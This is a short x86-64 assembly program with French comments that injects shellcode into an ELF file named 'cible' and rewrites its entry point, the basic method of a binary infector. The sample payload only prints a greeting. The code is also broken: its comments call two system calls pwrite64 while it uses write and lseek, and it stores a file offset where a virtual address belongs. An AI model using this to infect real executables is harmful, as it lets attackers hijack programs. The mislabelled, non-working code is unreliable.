section .data
filename db 'cible', 0           ; Nom du fichier ELF cible
entry_offset equ 0x18            ; Offset de e_entry dans l'en-tête ELF
injection_offset equ 0x1160      ; Offset où injecter le shellcode

shellcode:                       ; Shellcode simple : affiche "Hello, World!"
    call get_message
get_message:
    pop rsi                      ; Adresse du message
    mov rax, 1                   ; syscall write
    mov rdi, 1                   ; stdout
    mov rdx, msg_len             ; Taille du message
    syscall

    mov rax, 60                  ; syscall exit
    xor rdi, rdi                 ; Code de sortie 0
    syscall

msg db "Hello, World!", 0xA      ; Message à afficher
msg_len equ $ - msg              ; Taille du message
shellcode_size equ $ - shellcode ; Taille totale du shellcode

section .text
global _start

_start:
    ; 1. Ouvrir le fichier ELF en O_RDWR
    mov rax, 2                   ; syscall sys_open
    lea rdi, [rel filename]      ; Nom du fichier ELF
    mov rsi, 2                   ; O_RDWR
    syscall
    cmp rax, 0
    js error_exit
    mov r8, rax                  ; Sauvegarder le descripteur de fichier

    ; 2. Injecter le shellcode à l'offset choisi
    mov rax, 1                   ; syscall sys_pwrite64
    mov rdi, r8                  ; Descripteur de fichier
    lea rsi, [rel shellcode]     ; Adresse du shellcode
    mov rdx, shellcode_size      ; Taille du shellcode
    mov r10, injection_offset    ; Offset d'injection
    syscall

    ; 3. Modifier l'entrée principale (e_entry)
    mov rax, 8                   ; syscall sys_pwrite64
    mov rdi, r8                  ; Descripteur de fichier
    mov rsi, injection_offset    ; Adresse du shellcode (0x1160)
    mov rdx, 8                   ; Taille de l'écriture
    mov r10, entry_offset        ; Offset de e_entry
    syscall

    ; 4. Fermer le fichier
    mov rax, 3                   ; syscall sys_close
    mov rdi, r8                  ; Descripteur de fichier
    syscall

    ; Quitter proprement
    xor rdi, rdi
    mov rax, 60
    syscall

error_exit:
    mov rdi, 1                   ; Code d'erreur
    mov rax, 60
    syscall

